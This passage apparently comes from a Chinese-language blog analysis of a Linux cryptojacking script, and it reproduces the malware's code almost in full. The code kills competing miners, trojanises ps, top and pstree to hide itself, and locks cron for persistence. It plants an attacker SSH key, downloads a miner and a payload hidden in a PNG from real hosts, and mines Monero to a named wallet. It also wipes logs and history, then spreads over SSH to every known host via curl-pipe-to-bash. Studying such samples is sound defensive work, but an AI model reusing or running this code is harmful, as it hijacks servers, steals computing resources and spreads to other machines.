class="string">&#x27;svc&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HD7fcBgg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;zXcDajSs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3lmigMo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AkMK4A2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AJ2AkKe&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ€æ‰é™¤äº†zzhä¹‹å¤–çš„å ç”¨è¶…è¿‡cpuè¶…40%çš„è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">kill_sus_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    ps axf -o <span class="string">&quot;pid&quot;</span>|<span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            ls -l /proc/<span class="variable">$procid</span>/exe | grep /tmp</span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 1 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">                    <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    ps axf -o <span class="string">&quot;pid %cpu&quot;</span> | awk <span class="string">&#x27;&#123;if($2&gt;=40.0) print $1&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸‹è½½å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">downloads</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/curl&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span> </span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$1</span>,<span class="variable">$2</span></span><br><span class="line">        http_code=`curl -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/cd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        http_code=`cd1 -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wget&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wget --timeout=50 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    wget --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-chattr.html">chattrå‘½ä»¤ç®€ä»‹</a></p><p>ä½¿ç”¨chattrå®šä¹‰ä¸Šé”è§£é”å‡½æ•°</p><p>-R +iaé€’å½’ä¸Šé”</p><p>-R -iaé€’å½’è§£é”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">unlock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">lock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­$rtdiræ˜¯å¦å­˜åœ¨ï¼Œåœ¨ä¸Šé¢å®šä¹‰è¿‡ï¼š</p><p>rtdir=â€/etc/zzhsâ€</p><p>å­˜åœ¨å°±è¿›è¡Œï¼Œæ›´æ”¹äº†pså’Œtopå‘½ä»¤ï¼Œä½¿ç”¨grep -vå‘½ä»¤è¿‡æ»¤zzh,pnscan</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg:echo <span class="string">&quot;asasasas&quot;</span> | grep -v <span class="string">&quot;b&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;$rtdir&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        echo <span class="string">&quot;i am root&quot;</span></span><br><span class="line">        mkdir -p /root/.ssh</span><br><span class="line">        echo <span class="string">&quot;goto 1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>zzhs</span><br><span class="line">        chattr -ia /etc/zzh*</span><br><span class="line">        chattr -ia /etc/newinit.sh*</span><br><span class="line">        chattr -ia /root/.ssh/authorized_keys*</span><br><span class="line">        chattr -R -ia /root/.ssh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/ps /bin/ps.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        echo <span class="string">&quot;ps.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        chmod +x /bin/ps</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/ps</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/top.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/top changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/top /bin/top.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        echo <span class="string">&quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        chmod +x /bin/top</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/top</span><br><span class="line">        echo <span class="string">&quot;/bin/top changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/pstree.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/pstree /bin/pstree.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        echo <span class="string">&quot;pstree.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        chmod +x /bin/pstree</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/pstree</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/chattr&quot;</span> ]</span><br><span class="line">  then</span><br><span class="line">    chattrsize=<span class="string">`ls -l /bin/chattr | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;$chattrsize&quot;</span> -lt <span class="string">&quot;$chattr_size&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo <span class="string">&quot;no need install chattr&quot;</span></span><br><span class="line">    fi</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br></pre></td></tr></table></figure><p>å…ˆè§£é”ï¼Œè®¾ç½®æŒ–çŸ¿ç¨‹åºä»»åŠ¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unlock_cron</span><br><span class="line">                  rm -f $&#123;crondir&#125;</span><br><span class="line">                  rm -f /etc/cron.d/zzh</span><br><span class="line">                  rm -f /etc/crontab</span><br><span class="line">echo <span class="string">&quot;*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; $&#123;crondir&#125;</span><br><span class="line">echo <span class="string">&quot;*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>cron.d/zzh</span><br><span class="line">echo <span class="string">&quot;0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>crontab</span><br><span class="line">                  echo crontab created</span><br><span class="line">lock_cron</span><br></pre></td></tr></table></figure><p>è®¾ç½®å…å¯†ç™»å½•ï¼Œå¾€authorized_keysé‡Œé¢å†™å…¬é’¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> /root/.ssh/</span><br><span class="line">echo &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> /root/.ssh/authorized_keys</span><br><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver&quot;</span> &gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">file=<span class="string">&quot;/etc/zzh&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­zzhå­˜ä¸å­˜åœ¨ï¼Œå¼€å§‹downloadæŒ–çŸ¿ç¨‹åº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/etc/zzh&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        filesize1=<span class="string">`ls -l /etc/zzh | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;$filesize1&quot;</span> -ne <span class="string">&quot;$miner_size&quot;</span> ] </span><br><span class="line">        then</span><br><span class="line">            pkill -f zzh</span><br><span class="line">            rm /etc/zzh</span><br><span class="line">            downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            echo <span class="string">&quot;not need download&quot;</span></span><br><span class="line">        fi</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">downloads $sh_url /etc/indexni.png $sh_url_backup</span><br><span class="line">cd /etc/;dd <span class="keyword">if</span>=indexni.png <span class="keyword">of</span>=newinit.sh skip=<span class="number">17704</span> bs=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯åŠ¨è„šæœ¬æ—¶å‚æ•°ä¸ä¸º1å°±ä¸å¯åŠ¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chmod <span class="number">777</span> /etc/zzh</span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">    ps.original -fe|grep zzh |grep -v grep</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ps -fe|grep zzh |grep -v grep</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ $? -ne <span class="number">0</span> ]</span><br><span class="line">then</span><br><span class="line">            cd /etc</span><br><span class="line">            echo <span class="string">&quot;not root runing&quot;</span></span><br><span class="line">            sleep 5s</span><br><span class="line">            cpunum=<span class="string">`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­cpuæ ¸æ•°å¯åŠ¨æŒ–çŸ¿ç¨‹åº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">2</span> )); then</span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">4</span>)); then</span><br><span class="line">      cpunum=<span class="number">2</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">8</span>)); then</span><br><span class="line">      cpunum=<span class="number">4</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">16</span>)); then</span><br><span class="line">      cpunum=<span class="number">8</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">32</span>)); then</span><br><span class="line">      cpunum=<span class="number">16</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">32</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&gt;<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">50</span></span><br><span class="line">      echo $cpunum</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">fi</span><br><span class="line">                ./zzh -B --log-file=<span class="regexp">/etc/</span>etc --coin=monero -o stratum+tcp:<span class="comment">//xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B1fHgyJ7nJMZPudMrqULw2xoVZfTrinLHJWFJqytnNYTQEVFATKqBnFGSurDPyDCefrHU1QbSCe7A7jDoyKJcUcEaif3Qs.3910 -p x &amp;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                echo <span class="string">&quot;root runing.....&quot;</span></span><br></pre></td></tr></table></figure><p>å¼€æ”¾ç«¯å£ï¼Œé‡å¯é˜²ç«å¢™ï¼Œæ¸…é™¤å†å²å‘½ä»¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">5555</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">7777</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">service iptables reload</span><br><span class="line">ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep <span class="string">&quot;stratum&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs kill -<span class="number">9</span></span><br><span class="line">history -c</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>spool/mail/root</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/wtmp</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/secure</span><br><span class="line">echo &gt; <span class="regexp">/root/</span>.bash_history</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„ŸæŸ“è®¾ç½®äº†å…å¯†ç™»å½•çš„ä¸»æœº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt-get install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;curl -o indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wd1 https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;cd1 -o  indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line">echo <span class="string">&quot;$bbdir&quot;</span></span><br><span class="line">echo <span class="string">&quot;$bbdira&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
